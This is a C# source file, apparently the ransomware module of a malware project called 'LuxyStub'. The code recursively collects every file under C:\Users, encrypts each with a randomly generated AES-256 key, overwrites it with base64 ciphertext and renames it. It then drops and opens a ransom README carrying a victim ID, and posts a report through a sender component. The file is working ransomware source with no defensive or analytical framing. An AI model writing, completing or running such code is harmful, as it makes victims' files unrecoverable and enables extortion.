using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using LuxyStub.Modules.Ransomware.Components.Utilities;
using LuxyStub.Modules.Ransomware.Components.Algorithms;
using LuxyStub.Modules.Ransomware.Components.Postman;

namespace LuxyStub.Modules.Ransomware
{
    internal static class Ransomeware
    {
        public static async void Start()
        {
            Task.WaitAll(Process());
        }

        private static async Task Process()
        {
            //var encryptPath = @"C:\Users\Public\";
            //var encryptPath = $@"C:\Users\{Environment.UserName}\Desktop";
            var encryptPath = @"C:\Users";
            Common.ParsePath(encryptPath);
            var filesPath = Common.AllFiles.ToArray();
            if (filesPath.Length == 0)
            {
                return;
            }

            Settings.EncryptKey = Aes256.RandomBytesArray(32);
            Settings.EncryptIV = Aes256.RandomBytesArray(16);

            Guid personalID = Guid.NewGuid();
            Settings.PersonalID = personalID.ToString().Replace("-", "");

            try
            {
                foreach (var file in filesPath)
                {
                    try
                    {
                        Task encryptFileTask = EncryptFile(file);
                        await Task.WhenAll(encryptFileTask);
                    }
                    catch
                    {
                        continue;
                    }
                }

                var current_directory = Directory.GetCurrentDirectory();
                var readme_path = $"{current_directory}\\{Common.GenerateRandomString(10)}.README.txt";

                File.WriteAllText(readme_path, Settings.ReadMeMessage.Replace("{personal_id}", Settings.PersonalID));

                System.Diagnostics.Process.Start(readme_path);
                await Sender.Post(new Dictionary<string, int> { });

            }catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private static async Task EncryptFile(string file)
        {
            Console.WriteLine(file);
            var rawData = File.ReadAllBytes(file);
            var encryptedData = Aes256.Encrypt(rawData, Settings.EncryptKey, Settings.EncryptIV);
            File.WriteAllText(file, Convert.ToBase64String(encryptedData));
            File.Move(file, $"{file}.{Settings.EncryptExtension}");
        }
    }
}
